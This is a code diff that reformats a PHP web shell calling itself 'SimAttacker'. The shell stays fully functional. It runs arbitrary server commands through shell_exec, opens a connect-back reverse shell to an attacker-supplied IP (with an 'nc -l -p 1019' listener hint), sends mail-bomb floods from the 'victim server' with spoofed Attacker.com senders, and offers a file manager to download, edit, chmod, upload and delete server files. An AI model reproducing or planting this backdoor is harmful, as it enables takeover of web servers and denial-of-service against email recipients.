@@ -1,14 +1,14 @@
 <?php
 //download Files  Code
-$fdownload=$_GET['fdownload'];
-if ($fdownload <> "") {
+$fdownload = $_GET['fdownload'];
+if ('' != $fdownload) {
     // path & file name
     $path_parts = pathinfo("$fdownload");
-    $entrypath=$path_parts["basename"];
+    $entrypath = $path_parts['basename'];
     $name = "$fdownload";
     $fp = fopen($name, 'rb');
     header("Content-Disposition: attachment; filename=$entrypath");
-    header("Content-Length: " . filesize($name));
+    header('Content-Length: ' . filesize($name));
     fpassthru($fp);
     exit;
 }
@@ -31,24 +31,24 @@ body         { font-family: Tahoma; font-size: 8pt }
 error_reporting(E_ERROR | E_WARNING | E_PARSE);
 
  //File Edit
- $fedit=$_GET['fedit'];
- if ($fedit <> "") {
-     $fedit=realpath($fedit);
+ $fedit = $_GET['fedit'];
+ if ('' != $fedit) {
+     $fedit = realpath($fedit);
      $lines = file($fedit);
      echo "<form action='' method='POST'>";
-     echo "<textarea name='savefile' rows=30 cols=80>" ;
+     echo "<textarea name='savefile' rows=30 cols=80>";
      foreach ($lines as $line_num => $line) {
          echo htmlspecialchars($line);
      }
      echo "</textarea>
 	<input type='text' name='filepath'  size='60' value='$fedit'>
 	<input type='submit' value='save'></form>";
-     $savefile=$_POST['savefile'];
-     $filepath=realpath($_POST['filepath']);
-     if ($savefile <> "") {
-         $fp=fopen("$filepath", "w+");
-         fwrite($fp, "") ;
-         fwrite($fp, $savefile) ;
+     $savefile = $_POST['savefile'];
+     $filepath = realpath($_POST['filepath']);
+     if ('' != $savefile) {
+         $fp = fopen("$filepath", 'w+');
+         fwrite($fp, '');
+         fwrite($fp, $savefile);
          fclose($fp);
          echo "<script language='javascript'> close()</script>";
      }
@@ -57,9 +57,9 @@ error_reporting(E_ERROR | E_WARNING | E_PARSE);
 ?>
 <?php
 // CHmod - PRimission
-$fchmod=$_GET['fchmod'];
-if ($fchmod <> "") {
-    $fchmod=realpath($fchmod);
+$fchmod = $_GET['fchmod'];
+if ('' != $fchmod) {
+    $fchmod = realpath($fchmod);
     echo "<center><br>
 chmod for :$fchmod<br>
 <form method='POST' action=''><br>
@@ -67,11 +67,11 @@ Chmod :<br>
 <input type='text' name='chmod0' ><br>
 <input type='submit' value='change chmod'>
 </form>";
-    $chmod0=$_POST['chmod0'];
-    if ($chmod0 <> "") {
+    $chmod0 = $_POST['chmod0'];
+    if ('' != $chmod0) {
         chmod($fchmod, $chmod0);
     } else {
-        echo "primission Not Allow change Chmod";
+        echo 'primission Not Allow change Chmod';
     }
     exit();
 }
@@ -112,9 +112,9 @@ Chmod :<br>
 			<?php
             //*******************************************************
             //Start Programs About US
-            $id=$_GET['id'];
+            $id = $_GET['id'];
 
-            if ($id=="") {
+            if ('' == $id) {
                 echo "
 			<font face='Arial Black' color='#808080' size='1'>
 ***************************************************************************<br>
@@ -127,17 +127,17 @@ Enjoy :) [Only 4 Best Friends ] <br>
 ***************************************************************************</font></span></p>
 ";
 
-                echo "<font color='#333333' size='2'>OS :". php_uname();
-                echo "<br>IP :".
+                echo "<font color='#333333' size='2'>OS :" . php_uname();
+                echo '<br>IP :' .
 ($_SERVER['REMOTE_ADDR']);
-                echo "</font>";
+                echo '</font>';
             }
             //************************************************************
             //cmd-command line
-            $cmd=$_POST['cmd'];
-            if ($id=="cmd") {
-                $result=shell_exec("$cmd");
-                echo "<br><center><h3> CMD ExeCute </h3></center>" ;
+            $cmd = $_POST['cmd'];
+            if ('cmd' == $id) {
+                $result = shell_exec("$cmd");
+                echo '<br><center><h3> CMD ExeCute </h3></center>';
                 echo "<center>
 		<textarea rows=20 cols=70 >$result</textarea><br>
 		<form method='POST' action=''>
@@ -145,13 +145,13 @@ Enjoy :) [Only 4 Best Friends ] <br>
 		<input type='text' size='80' name='cmd' value='$cmd'>
 		<input type='submit' value='cmd'><br>";
             }
-            
+
         //********************************************************
-        
+
         //fake mail = Use victim server 4 DOS - fake mail
-        if ($id=="fake-mail") {
+        if ('fake-mail' == $id) {
             error_reporting(0);
-            echo "<br><center><h3> Fake Mail- DOS E-mail By Victim Server </h3></center>" ;
+            echo '<br><center><h3> Fake Mail- DOS E-mail By Victim Server </h3></center>';
             echo "<center><form method='post' action=''>
 		Victim Mail :<br><input type='text' name='to' ><br>
 		Number-Mail :<br><input type='text' size='5' name='nom' value='100'><br>
@@ -161,13 +161,13 @@ Enjoy :) [Only 4 Best Friends ] <br>
 		<input type='submit' value='Send Mail Strm ' >
 		</form></center>";
             //send Storm Mail
-            $to=$_POST['to'];
-            $nom=$_POST['nom'];
-            $Comments=$_POST['Comments'];
-            if ($to <> "") {
-                for ($i = 0; $i < $nom ; $i++) {
-                    $from = rand(71, 1020000000)."@"."Attacker.com";
-                    $subject= md5("$from");
+            $to = $_POST['to'];
+            $nom = $_POST['nom'];
+            $Comments = $_POST['Comments'];
+            if ('' != $to) {
+                for ($i = 0; $i < $nom; ++$i) {
+                    $from = rand(71, 1020000000) . '@' . 'Attacker.com';
+                    $subject = md5("$from");
                     mail($to, $subject, $Comments, "From:$from");
                     echo "$i is ok";
                 }
@@ -177,7 +177,7 @@ Enjoy :) [Only 4 Best Friends ] <br>
         //********************************************************
 
             //Connect Back -Firewall Bypass
-            if ($id=="cshell") {
+            if ('cshell' == $id) {
                 echo "<br>Connect back Shell , bypass Firewalls<br>
 			For user :<br>
 			nc -l -p 1019 <br>
@@ -188,30 +188,30 @@ Enjoy :) [Only 4 Best Friends ] <br>
 			<input type='text' name='bport' size='5' value='1019'><br>
 			<input type='submit' value='Connect Back'>
 			</form>";
-                $mip=$_POST['mip'];
-                $bport=$_POST['bport'];
-                if ($mip <> "") {
-                    $fp=fsockopen($mip, $bport, $errno, $errstr);
+                $mip = $_POST['mip'];
+                $bport = $_POST['bport'];
+                if ('' != $mip) {
+                    $fp = fsockopen($mip, $bport, $errno, $errstr);
                     if (!$fp) {
-                        $result = "Error: could not open socket connection";
+                        $result = 'Error: could not open socket connection';
                     } else {
                         fputs($fp, "\n*********************************************\nWelcome T0 SimAttacker 1.00  ready 2 USe\n*********************************************\n\n");
                         while (!feof($fp)) {
-                            fputs($fp, " bash # ");
-                            $result= fgets($fp, 4096);
-                            $message=`$result`;
-                            fputs($fp, "--> ".$message."\n");
+                            fputs($fp, ' bash # ');
+                            $result = fgets($fp, 4096);
+                            $message = `$result`;
+                            fputs($fp, '--> ' . $message . "\n");
                         }
                         fclose($fp);
                     }
                 }
             }
-            
+
         //********************************************************
             //Spy File Manager
-            $homedir=getcwd();
-            $dir=realpath($_GET['dir'])."/";
-            if ($id=="fm") {
+            $homedir = getcwd();
+            $dir = realpath($_GET['dir']) . '/';
+            if ('fm' == $id) {
                 echo "<br><b><p align='left'>&nbsp;Home:</b> $homedir 
                   &nbsp;<b>
                   <form action='' method='GET'>
@@ -240,54 +240,53 @@ Enjoy :) [Only 4 Best Friends ] <br>
 		<td height='28' align='center'><font color='#FF0000' size='2'><b>Delete</b></font></td>
 	</tr>";
                 if (is_dir($dir)) {
-                    if ($dh=opendir($dir)) {
-                        while (($file = readdir($dh)) !== false) {
-                            $fsize=round(filesize($dir . $file)/1024);
-        
-            
+                    if ($dh = opendir($dir)) {
+                        while (false !== ($file = readdir($dh))) {
+                            $fsize = round(filesize($dir . $file) / 1024);
+
                             echo " 
 	<tr>
 		<th width='250' height='22' align='left' nowrap>";
-                            if (is_dir($dir.$file)) {
+                            if (is_dir($dir . $file)) {
                                 echo "<a href='?id=fm&dir=$dir$file'><span style='text-decoration: none'><font size='2' color='#666666'>&nbsp;$file <font color='#FF0000' size='1'>dir</font>";
                             } else {
                                 echo "<font size='2' color='#666666'>&nbsp;$file ";
                             }
                             echo "</a></font></th>
 		<td width='113' align='center' nowrap><font color='#000080' size='2'><b>";
-                            if (is_file($dir.$file)) {
+                            if (is_file($dir . $file)) {
                                 echo "$fsize";
                             } else {
-                                echo "&nbsp; ";
+                                echo '&nbsp; ';
                             }
                             echo "
 		</b></font></td>
 		<td width='103' align='center' nowrap>";
-                            if (is_file($dir.$file)) {
-                                if (is_readable($dir.$file)) {
+                            if (is_file($dir . $file)) {
+                                if (is_readable($dir . $file)) {
                                     echo "<a href='?id=fm&fdownload=$dir$file'><span style='text-decoration: none'><font size='2' color='#008000'>download";
                                 } else {
                                     echo "<font size='1' color='#FF0000'><b>No ReadAble</b>";
                                 }
                             } else {
-                                echo "&nbsp;";
+                                echo '&nbsp;';
                             }
                             echo "
 		</a></font></td>
 		<td width='77' align='center' nowrap>";
-                            if (is_file($dir.$file)) {
-                                if (is_readable($dir.$file)) {
+                            if (is_file($dir . $file)) {
+                                if (is_readable($dir . $file)) {
                                     echo "<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decoration: none'><font color='#FF9933' size='2'>Edit";
                                 } else {
                                     echo "<font size='1' color='#FF0000'><b>No ReadAble</b>";
                                 }
                             } else {
-                                echo "&nbsp;";
+                                echo '&nbsp;';
                             }
                             echo "
 		</a></font></td>
 		<td width='86' align='center' nowrap>";
-                            if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+                            if ('WIN' === strtoupper(substr(PHP_OS, 0, 3))) {
                                 echo "<font size='1' color='#999999'>Dont in windows";
                             } else {
                                 echo "<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><font size='2' color='#999999'>Chmod";
@@ -310,18 +309,18 @@ Enjoy :) [Only 4 Best Friends ] <br>
 		    </div>";
             }
 //Upload Files
-$rpath=$_GET['dir'];
-if ($rpath <> "") {
-    $uploadfile = $rpath."/" . $_FILES['userfile']['name'];
-    print "<pre>";
+$rpath = $_GET['dir'];
+if ('' != $rpath) {
+    $uploadfile = $rpath . '/' . $_FILES['userfile']['name'];
+    echo '<pre>';
     if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
         echo "<script language='javascript'> alert('\:D Successfully uploaded.!')</script>";
         echo "<script language='javascript'> history.back(2)</script>";
     }
 }
  //file deleted
-$frpath=$_GET['fdelete'];
-if ($frpath <> "") {
+$frpath = $_GET['fdelete'];
+if ('' != $frpath) {
     if (is_dir($frpath)) {
         $matches = glob($frpath . '/*.*');
         if (is_array($matches)) {
